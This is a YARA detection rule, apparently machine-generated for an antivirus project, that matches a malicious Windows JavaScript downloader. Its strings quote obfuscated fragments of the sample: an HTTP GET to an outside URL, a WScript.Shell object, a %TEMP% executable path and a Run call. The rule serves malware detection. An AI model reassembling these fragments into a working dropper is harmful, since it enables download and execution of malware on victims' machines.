rule sig_20160401_ae6668799f00cdd6ad6855add58a766b {
  meta:
    description = "datamaliciousorder - file 20160401_ae6668799f00cdd6ad6855add58a766b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1fde16d5a9463b717de58965e2423d20a158f692111e600f0a2935d709bf444f"

  strings:
    $s1  = "PcSvb[PzeXmt](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var EqiQrp = function PejGr() {return WScript[OdVl](\"WScript\"+\".Shell\");}(), CrPqm = 11;" fullword ascii
    $s3  = "function HvVy(WyyMd, WyVhi){SxxMd = SxxMd * 1; return WyyMd - WyVhi;};" fullword ascii
    $s4  = "if (PcSvb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function VelIvr(){return AzBq + \"\";};" fullword ascii
    $s6  = "function AalJp() {return EqiQrp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ew0Fb5qh.ex\" + \"e\";};" fullword ascii
    $s7  = "function BvJa() {return ((AznBy == true) && (AznBy == NuLp)) ? 1 : SxxMd;};" fullword ascii
    $s8  = "}while (FlIwb);" fullword ascii
    $s9  = "var NuLp = false;" fullword ascii
    $s10 = "function VobIt()" fullword ascii
    $s11 = "function LsZlp(){return OdVl;};" fullword ascii
    $s12 = "var AznBy = false;" fullword ascii
    $s13 = "function NjlEjm(ZfNpm){EqiQrp[\"R\"+\"un\"](ZfNpm, SxxMd, SxxMd);};" fullword ascii
    $s14 = "function SwgFbf(){return 23;};" fullword ascii
    $s15 = "function RzMn(KurMn) {var RyrSxe = (1, 2, 3, 4, 5, KurMn); return RyrSxe;};" fullword ascii
    $s16 = "var AiRul = false;" fullword ascii
    $s17 = "NuLp = true; " fullword ascii
    $s18 = "var XnGfw = new this[\"Date\"]();" fullword ascii
    $s19 = "AznBy = true; " fullword ascii
    $s20 = "return HvVy(IwLzq, KxFj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}